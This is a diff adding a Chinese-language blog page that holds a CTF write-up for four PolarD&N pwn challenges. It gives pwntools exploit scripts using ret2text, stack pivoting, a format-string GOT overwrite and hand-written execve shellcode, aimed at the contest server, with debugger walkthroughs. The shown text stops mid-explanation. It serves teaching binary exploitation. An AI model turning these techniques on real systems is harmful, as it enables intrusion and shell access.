@@ -1,0 +1,446 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css" integrity="sha256-dABdfBfUoC8vJUBOwGVdm8L9qlMWaHTIfXt+7GnZCIo=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"maple-pwn.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.23.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="PolarD&amp;N冬季个人赛wpby Maple  题目可以在这里找，就不上附件了（版权）  like_lib332位ret2text 12345678from pwn import *#p &#x3D; process(&#x27;.&#x2F;pwn&#x27;)p &#x3D; remote(&#x27;1.95.36.136&#x27;,2055)elf &#x3D; ELF(&#x27;.&#x2F;pwn&#x27;)sys &#x3D;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Maple">
+<meta property="og:url" content="http://maple-pwn.github.io/2025/04/04/polarD&N/%E5%86%AC%E5%AD%A3%E8%B5%9B/index.html">
+<meta property="og:site_name" content="Maple">
+<meta property="og:description" content="PolarD&amp;N冬季个人赛wpby Maple  题目可以在这里找，就不上附件了（版权）  like_lib332位ret2text 12345678from pwn import *#p &#x3D; process(&#x27;.&#x2F;pwn&#x27;)p &#x3D; remote(&#x27;1.95.36.136&#x27;,2055)elf &#x3D; ELF(&#x27;.&#x2F;pwn&#x27;)sys &#x3D;">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://maple-pwn.github.io/2025/04/04/polarD&N/%E5%86%AC%E5%AD%A3%E8%B5%9B/images/image-20250203140921533.png">
+<meta property="og:image" content="http://maple-pwn.github.io/images/image-20250203142323438.png">
+<meta property="og:image" content="http://maple-pwn.github.io/images/image-20250203142504855.png">
+<meta property="og:image" content="http://maple-pwn.github.io/images/image-20250203143114522.png">
+<meta property="og:image" content="http://maple-pwn.github.io/images/image-20250203143717093.png">
+<meta property="og:image" content="http://maple-pwn.github.io/images/image-20250203143733532.png">
+<meta property="og:image" content="http://maple-pwn.github.io/images/image-20250204142234302.png">
+<meta property="og:image" content="http://maple-pwn.github.io/images/image-20250204142049107.png">
+<meta property="og:image" content="http://maple-pwn.github.io/images/image-20250204142643257.png">
+<meta property="og:image" content="http://maple-pwn.github.io/images/image-20250204144416284.png">
+<meta property="og:image" content="http://maple-pwn.github.io/images/image-20250204151131205.png">
+<meta property="og:image" content="http://maple-pwn.github.io/images/image-20250204152000363.png">
+<meta property="og:image" content="http://maple-pwn.github.io/images/image-20250204152406421.png">
+<meta property="og:image" content="http://maple-pwn.github.io/images/image-20250204152649263.png">
+<meta property="article:published_time" content="2025-04-03T17:34:37.036Z">
+<meta property="article:modified_time" content="2025-02-11T08:39:52.805Z">
+<meta property="article:author" content="Maple">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://maple-pwn.github.io/2025/04/04/polarD&N/%E5%86%AC%E5%AD%A3%E8%B5%9B/images/image-20250203140921533.png">
+
+
+<link rel="canonical" href="http://maple-pwn.github.io/2025/04/04/polarD&N/%E5%86%AC%E5%AD%A3%E8%B5%9B/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://maple-pwn.github.io/2025/04/04/polarD&N/%E5%86%AC%E5%AD%A3%E8%B5%9B/","path":"2025/04/04/polarD&N/冬季赛/","title":""}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title> | Maple</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Maple</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">Maple’s Blog</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#PolarD-N%E5%86%AC%E5%AD%A3%E4%B8%AA%E4%BA%BA%E8%B5%9Bwp"><span class="nav-number">1.</span> <span class="nav-text">PolarD&amp;N冬季个人赛wp</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#like-lib3"><span class="nav-number">1.1.</span> <span class="nav-text">like_lib3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#stack"><span class="nav-number">1.2.</span> <span class="nav-text">stack</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#tanjniu"><span class="nav-number">1.3.</span> <span class="nav-text">tanjniu</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2plt%E8%A1%A8%E5%8A%AB%E6%8C%81got%E8%A1%A8%E4%BB%8B%E7%BB%8D"><span class="nav-number">1.3.1.</span> <span class="nav-text">格式化字符串plt表劫持got表介绍</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E7%A1%AE%E5%AE%9A%E8%BE%93%E5%85%A5%E4%BD%8D%E7%BD%AE"><span class="nav-number">1.3.2.</span> <span class="nav-text">为什么要确定输入位置</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#bllbl-shellcode-3%E2%AD%90"><span class="nav-number">1.4.</span> <span class="nav-text">bllbl_shellcode_3⭐</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A0%88%E8%BF%81%E7%A7%BB%E9%83%A8%E5%88%86"><span class="nav-number">1.4.1.</span> <span class="nav-text">栈迁移部分</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%99%E5%85%A5shellcode"><span class="nav-number">1.4.2.</span> <span class="nav-text">写入shellcode</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%86%99shellcode"><span class="nav-number">1.4.2.1.</span> <span class="nav-text">写shellcode</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%A1%A5%E5%85%85%E7%BB%86%E8%8A%82"><span class="nav-number">1.4.2.2.</span> <span class="nav-text">补充细节</span></a></li></ol></li></ol></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Maple</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">44</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://maple-pwn.github.io/2025/04/04/polarD&N/%E5%86%AC%E5%AD%A3%E8%B5%9B/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Maple">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Maple">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Maple">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2025-04-04 01:34:37" itemprop="dateCreated datePublished" datetime="2025-04-04T01:34:37+08:00">2025-04-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2025-02-11 16:39:52" itemprop="dateModified" datetime="2025-02-11T16:39:52+08:00">2025-02-11</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h1 id="PolarD-N冬季个人赛wp"><a href="#PolarD-N冬季个人赛wp" class="headerlink" title="PolarD&amp;N冬季个人赛wp"></a>PolarD&amp;N冬季个人赛wp</h1><p>by Maple</p>
+<blockquote>
+<p>题目可以在<a target="_blank" rel="noopener" href="https://www.polarctf.com/#/page/challenges">这里</a>找，就不上附件了（版权）</p>
+</blockquote>
+<h2 id="like-lib3"><a href="#like-lib3" class="headerlink" title="like_lib3"></a>like_lib3</h2><p>32位<em><strong>ret2text</strong></em></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;1.95.36.136&#x27;</span>,<span class="number">2055</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">sys = elf.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&#x27;b&#x27;</span>*(<span class="number">0x2c</span>+<span class="number">4</span>)+p32(sys)+p32(<span class="number">0</span>)+p32(<span class="number">0x0804857c</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="stack"><a href="#stack" class="headerlink" title="stack"></a>stack</h2><p><em><strong>栈迁移</strong></em>，但不多</p>
+<p>通过栈迁移覆盖<code>rbp</code>的值，让<code>rbp</code>的位置变成<code>passwd</code>，从而实现任意地址读写</p>
+<p>需要注意<code>scanf</code>函数读取的偏移是<code>4</code></p>
+<img src="./images/image-20250203140921533.png" alt="image-20250203140921533" style="zoom:67%;" />
+
+<p>所以可以将<code>passwd</code>迁移到<code>rbp+0x4</code>的位置，这样通过<code>scanf</code>读入寻址，刚好读到<code>rbp</code>上</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = <span class="string">&#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;</span>.split()</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&quot;./libc.so.6&quot;)</span></span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;1.95.36.136&#x27;</span>,<span class="number">2138</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">passwd_addr = <span class="number">0x4033CC</span></span><br><span class="line">payload = <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x50</span>+p64(passwd_addr+<span class="number">0x4</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;input1:&quot;</span>,<span class="string">&quot;4660&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>有些不理解？我们调试看看</p>
+<ul>
+<li>未输入payload时</li>
+</ul>
+<p><img src="/./images/image-20250203142323438.png" alt="image-20250203142323438"></p>
+<blockquote>
+<p>可以看到此时的rbp还是存储的栈结尾地址，<code>0x7ffedda9ade0</code></p>
+</blockquote>
+<ul>
+<li>输入<code>payload</code></li>
+</ul>
+<p><img src="/./images/image-20250203142504855.png" alt="image-20250203142504855"></p>
+<blockquote>
+<p>可以看到此时<code>rbp</code>已经被额外的数据覆盖了，这里<code>0x4033d0</code>也就是<code>passwd_addr+0x4</code></p>
+</blockquote>
+<ul>
+<li><p><code>scanf</code>之后</p>
+<p><img src="/./images/image-20250203143114522.png" alt="image-20250203143114522"></p>
+</li>
+</ul>
+<blockquote>
+<p>这里是将<code>rax</code>的值赋给<code>rbp-4</code>,而rax暂时存储我们的输入，也就是说，这里将4660传递给了<code>rbp-4</code>的位置，那么我们的<code>rbp</code>是多少呢，<code>passwd_addr+0x4</code>!，所以4660传递给了<code>passwd</code>,完成</p>
+</blockquote>
+<ul>
+<li><p>那v4呢？接着看</p>
+<p><img src="/./images/image-20250203143717093.png" alt="image-20250203143717093"></p>
+</li>
+</ul>
+<p><img src="/./images/image-20250203143733532.png" alt="image-20250203143733532"></p>
+<blockquote>
+<p>可以看一下静态汇编，这里第一个判断是将<code>passwd</code>的值传给<code>eax</code>,然后比较；第二个判断是<code>rbp-4</code>的位置传递给<code>eax</code>，然后比较。</p>
+<p>同时动态调试这里也展示的很清楚，pwndbg直接给解释为两次对<code>passwd</code>和<code>0x1234</code>比较</p>
+<p>所以v4，其实已经被抛弃了（瓦达西…)</p>
+</blockquote>
+<p>总之呢，这里可以实现的关键在于<strong>局部变量的寻值是按照rbp的相对偏移</strong>，所以将rbp移动后会改变寻值的对象</p>
+<h2 id="tanjniu"><a href="#tanjniu" class="headerlink" title="tanjniu"></a>tanjniu</h2><p><strong>格式化字符串plt表劫持got表</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = <span class="string">&#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;</span>.split()</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;1.95.36.136&#x27;</span>,<span class="number">2054</span>)</span><br><span class="line"></span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">system_plt = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">payload = fmtstr_payload(<span class="number">7</span>,&#123;printf_got:system_plt&#125;)</span><br><span class="line">p.sendline(<span class="string">b&#x27;s&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="格式化字符串plt表劫持got表介绍"><a href="#格式化字符串plt表劫持got表介绍" class="headerlink" title="格式化字符串plt表劫持got表介绍"></a>格式化字符串plt表劫持got表介绍</h3><p>本质上是因为未开启<code>FUll RELRO</code>保护，所以plt表和got表可以被修改；并且格式化字符串有着<strong>任意地址写</strong>的能力。所以可以覆盖GOT表中某个函数的地址，使其指向恶意代码</p>
+<blockquote>
+<p>RELRO（read only relocation）是一种用于加强对binary数据段的保护的技术，大概实现由linker指定binary的一块经过dynamic linker处理过 relocation之后的区域为只读，设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号</p>
+</blockquote>
+<p>而pwntools中有格式化字符串修改函数<code>fmtstr_payload(offset,&#123;address:data&#125;)</code>,在buu里面应该讲过，不说了就</p>
+<p>&#x3D;&#x3D;注意这个函数只能给32位程序用&#x3D;&#x3D;</p>
+<h3 id="为什么要确定输入位置"><a href="#为什么要确定输入位置" class="headerlink" title="为什么要确定输入位置"></a>为什么要确定输入位置</h3><ol>
+<li><p><strong>格式化字符串的工作原理：</strong></p>
+<p>当调用如<code>printf(buf)</code>时，<code>printf</code>会从栈上按顺序读取参数</p>
+<ul>
+<li>第一个参数时格式化字符串（<code>buf</code>的地址）</li>
+<li>后续参数时对应格式化字符串中的格式说明符（<code>%d</code>,<code>%s</code>,<code>%n</code>等）</li>
+</ul>
+<blockquote>
+<p>例如：<code>printf(&quot;%d %s&quot;, num, str)</code>这一命令在32位情况下的栈布局</p>
+<p>| 返回地址       |  ← 栈顶<br>| 格式化字符串地址 |  ← printf的第一个参数<br>| num的地址      |  ← printf的第二个参数（对应%d）<br>| str的地址      |  ← printf的第三个参数（对应%s）</p>
+</blockquote>
+</li>
+<li><p><strong>漏洞利用的核心：控制栈上的参数</strong></p>
+<p>如果用户输入的<code>buf</code>包含<strong>可控的格式说明符</strong>（<code>%x</code>,<code>%n</code>等)，可以利用这些访问或者修改栈上的数据</p>
+</li>
+<li><p><strong>确定输入位置</strong></p>
+<p><code>fmtstr_payload(offset,&#123;address:data&#125;)</code>的底层工作原理是：</p>
+<ul>
+<li>将<code>address</code>写入栈中，使其占据第<code>offset</code>个参数的位置</li>
+<li>用<code>%offset$n</code>来修改地址处的值为<code>system</code>的地址</li>
+</ul>
+</li>
+</ol>
+<h2 id="bllbl-shellcode-3⭐"><a href="#bllbl-shellcode-3⭐" class="headerlink" title="bllbl_shellcode_3⭐"></a>bllbl_shellcode_3⭐</h2><p><em><strong>栈迁移+汇编编写shellcode</strong></em></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = <span class="string">&#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;</span>.split()</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&quot;./libc.so.6&quot;)</span></span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">bss_addr = <span class="number">0x4040A0</span></span><br><span class="line">leave_ret = <span class="number">0x401338</span></span><br><span class="line">readbss = <span class="number">0x401321</span></span><br><span class="line">jmp_rsp = <span class="number">0x401342</span></span><br><span class="line">sh_addr = <span class="number">0x40201d</span></span><br><span class="line">payload = <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x8</span>+p64(bss_addr)+p64(readbss)+p64(leave_ret)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">shellcode = asm(<span class="string">&quot;nop;&quot;</span>)</span><br><span class="line">shellcode+=asm(<span class="string">&quot;mov al,0x3b;mov esi,edi;mov edi,0x40201d;mov edx,esi;syscall;&quot;</span>)</span><br><span class="line">shellcode+=asm(<span class="string">&quot;nop;nop&quot;</span>)</span><br><span class="line">shellcode+=p64(jmp_rsp)</span><br><span class="line"></span><br><span class="line">p.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>题目直接给我们说BSS段上可以运行<code>/bin/sh</code>，所以应该是需要一步栈迁移的，分析一下</p>
+<h3 id="栈迁移部分"><a href="#栈迁移部分" class="headerlink" title="栈迁移部分"></a>栈迁移部分</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">yichu</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+8h] [rbp-8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(asc_402028);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x20u</span>LL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>buf距离栈底仅8字节，但<code>read</code>可读入0x20字节，可以覆盖<code>ebp</code>以及后面的一部分，所以我们直接让<code>bss</code>段的地址覆盖</li>
+</ul>
+<p><code>ebp</code></p>
+<ul>
+<li>然后还是需要向<code>bss</code>段写入shellcode，所以还需要一个read函数，直接对原本的read函数进行一个重新调用</li>
+<li>接下来通过<code>leave_ret</code>，将栈移动</li>
+</ul>
+<p><img src="/./images/image-20250204142234302.png" alt="image-20250204142234302"></p>
+<p><img src="/./images/image-20250204142049107.png" alt="image-20250204142049107"></p>
+<blockquote>
+<p>这是输入payload前后的栈，可以看到以下几个变化</p>
+<ul>
+<li>rbp变为了bss段地址</li>
+<li>rbp下面从执行结束指令变为了执行read指令</li>
+<li>leave指令被写入</li>
+</ul>
+</blockquote>
+<p><img src="/./images/image-20250204142643257.png" alt="image-20250204142643257"></p>
+<blockquote>
+<p>这是执行完<code>leave_ret</code>后的寄存器，可以看到栈顶将要执行read函数，栈底（<code>rbp</code>）已经转移到了<code>bss</code>段</p>
+</blockquote>
+<p><strong>至此，我们已经完成了栈迁移的操作，已经将栈底转移到了bss段，也将执行read函数，可以读入shellcode到bss段了</strong></p>
+<blockquote>
+<p>注：关于为什么rbp转移了就可以通过read读入到bss中</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">buf             = byte ptr <span class="number">-8</span></span><br><span class="line">lea     rax, [rbp+buf]</span><br><span class="line">mov     edx, <span class="number">20</span>h 		; nbytes</span><br><span class="line">mov     rsi, rax        ; buf</span><br><span class="line">mov     edi, <span class="number">0</span>          ; fd</span><br><span class="line">call    _read</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>可以看到存储我们要读入区域的地址（buf，也就是第4行处）的寄存器（rsi）是由rax掌控的</p>
+</li>
+<li><p>而rax又是由[rbp+buf]掌控的，buf又是一个固定的8字节偏移</p>
+</li>
+<li><p>所以只需要移动rbp就可以掌控写入的地址</p>
+</li>
+</ul>
+</blockquote>
+<h3 id="写入shellcode"><a href="#写入shellcode" class="headerlink" title="写入shellcode"></a>写入shellcode</h3><p>即便是可以写入shllcode了，但是我们还是只有0x20字节的空间写入shellcode，常用的<code>asm(shellcraft.sh())</code>需要0x30字节，不够写入，所以需要我们手写一下简化的shellcode</p>
+<h4 id="写shellcode"><a href="#写shellcode" class="headerlink" title="写shellcode"></a><strong>写shellcode</strong></h4><p>可以看一下在执行完read之后一些比较关键的寄存器都是多少</p>
+<p><img src="/./images/image-20250204144416284.png" alt="image-20250204144416284"></p>
+<ul>
+<li>RSI指向0x404098,将开始执行此处的指令</li>
+<li>RDI（EDI）为0</li>
+</ul>
+<p>那么可以先写出来可以执行的汇编</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mov al, 0x3b		;	设置系统调用号，0x3b对应execve(al为rax的字节型)</span><br><span class="line">mov	esi, edi		;	将edi赋给esi，此时edi=esi=0</span><br><span class="line">mov	edi, 0x40201d	;	将0x40201d赋给edi，此时edi=0x40201d(/bin/sh的地址)</span><br><span class="line">mov edx, esi		;	将esi赋给edx，此时esi=0</span><br><span class="line">syscall				;	调用syscall</span><br><span class="line">;	syscall([al]0x3b)-&gt;execve([rdi]0x40201d, [rsi]NULL, [rds]NULL)</span><br></pre></td></tr></table></figure>
+
+<p>因此实现了shellcode的写入。但是执行之后没法getshell，继续调试看看</p>
+<h4 id="补充细节"><a href="#补充细节" class="headerlink" title="补充细节"></a><strong>补充细节</strong></h4><p><img src="/./images/image-20250204151131205.png" alt="image-20250204151131205"></p>
+<p>这里是执行<code>leave_ret</code>的ret前，可以看到rsp是指向<code>0x4040a8</code>的，但我们的汇编码写在了rsi指向的<code>00404098</code>处，这样的话不论怎么执行，命令指针永远不会指向我们的汇编码那里，所以还需要对rsp进行操作</p>
+<p>发现还有一个叫reg的函数，看一下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push    rbp</span><br><span class="line">mov     rbp, rsp</span><br><span class="line">sub     rsp, <span class="number">17</span>h</span><br><span class="line">jmp     rsp</span><br></pre></td></tr></table></figure>
+
